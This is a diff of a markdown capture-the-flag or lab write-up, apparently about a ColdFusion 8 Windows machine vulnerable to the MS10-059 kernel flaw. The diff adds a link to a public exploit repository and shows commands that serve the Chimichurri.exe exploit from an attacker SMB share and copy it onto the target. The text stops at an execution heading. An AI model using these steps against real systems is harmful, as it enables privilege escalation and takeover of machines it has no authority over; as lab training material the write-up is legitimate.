@@ -62,15 +62,18 @@ Nmap done: 1 IP address (1 host up) scanned in 137.00 seconds
 ![image](https://user-images.githubusercontent.com/83878909/229284588-f0e96832-3491-4d2b-a027-54795caa0a55.png)
 
   - The target machine's kernel is vulnerable to **MS10-059**.
+  - Exploit [(Link)](https://github.com/egre55/windows-kernel-exploits)
 
-### Transfer the Exploit
+### Exploit
   - 
 ```CSS
 ▶ impacket-smbserver share $(pwd) -smb2support 
 ```
 ```CSS
-C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\chimichurri.exe
+C:\ColdFusion8\runtime\bin>copy \\10.10.14.34\share\Chimichurri.exe
 ```
+![image](https://user-images.githubusercontent.com/83878909/229303301-4b8fef70-a000-42f7-9b72-2dc8c7af037a.png)
+
 
 ### Execute the Exploit
 ```CSS
